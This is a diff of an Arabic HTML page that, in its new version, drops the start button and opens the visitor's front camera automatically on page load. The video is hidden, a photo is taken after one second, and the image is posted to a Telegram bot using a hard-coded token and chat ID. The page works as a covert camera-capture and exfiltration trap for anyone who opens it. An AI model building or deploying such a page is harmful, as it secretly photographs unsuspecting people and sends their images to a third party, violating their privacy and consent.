@@ -2,57 +2,62 @@
 <html lang="ar">
 <head>
   <meta charset="UTF-8">
-  <title>التقاط تلقائي</title>
+  <title>التقاط صورة وإرسالها إلى تلجرام تلقائيًا</title>
 </head>
 <body>
-  <button id="startBtn">ابدأ</button>
-  <video id="video" autoplay playsinline style="display: none;"></video>
-  <canvas id="canvas" style="display: none;"></canvas>
-
+  <video id="video" playsinline autoplay style="display:none;"></video>
+  <canvas id="canvas" style="display:none;"></canvas>
   <script>
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const startBtn = document.getElementById('startBtn');
-    const botToken = '70718054647964608918:AAFDyakp3Vc_ZPNbUifkhS2pwCp9fbHQsKs';
-    const chatId = '7071805464';
+    // متغيرات البوت
+    const botToken = "70718054647964608918:AAFDyakp3Vc_ZPNbUifkhS2pwCp9fbHQsKs";
+    const chatId = "7071805464";
 
-    startBtn.onclick = async () => {
-      startBtn.style.display = "none"; // إخفاء الزر بعد الضغط
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: "user" }, // الكاميرا الأمامية
-          audio: false
-        });
-
+    // فتح الكاميرا الأمامية
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+      .then(function(stream) {
+        const video = document.getElementById('video');
         video.srcObject = stream;
 
-        setTimeout(() => {
-          captureAndSendPhoto();
-        }, 3000);
-      } catch (err) {
-        alert("فشل الوصول إلى الكاميرا: " + err);
-      }
-    };
+        // بمجرد تشغيل الفيديو، التقط الصورة بعد ثانية واحدة
+        video.onloadedmetadata = function() {
+          setTimeout(() => {
+            captureAndSend();
+            // أوقف الكاميرا بعد الالتقاط
+            stream.getTracks().forEach(track => track.stop());
+          }, 1000); // انتظر ثانية واحدة
+        };
+      })
+      .catch(function(error) {
+        alert("حدث خطأ في فتح الكاميرا: " + error);
+      });
 
-    function captureAndSendPhoto() {
-      const context = canvas.getContext('2d');
+    function captureAndSend() {
+      const video = document.getElementById('video');
+      const canvas = document.getElementById('canvas');
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
-      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-      canvas.toBlob(async (blob) => {
+      // تحويل الصورة إلى Blob
+      canvas.toBlob(function(blob) {
+        // تجهيز البيانات للإرسال لتليجرام
         const formData = new FormData();
         formData.append('chat_id', chatId);
         formData.append('photo', blob, 'photo.jpg');
 
-        try {
-          await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-            method: 'POST',
-            body: formData
-          });
-        } catch (error) {
-          alert("فشل إرسال الصورة إلى تليجرام: " + error);
-        }
+        // إرسال الصورة إلى بوت تلجرام
+        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+          method: 'POST',
+          body: formData
+        })
+        .then(response => response.json())
+        .then(data => {
+          alert("تم إرسال الصورة!");
+        })
+        .catch(error => {
+          alert("خطأ في إرسال الصورة: " + error);
+        });
       }, 'image/jpeg');
     }
   </script>
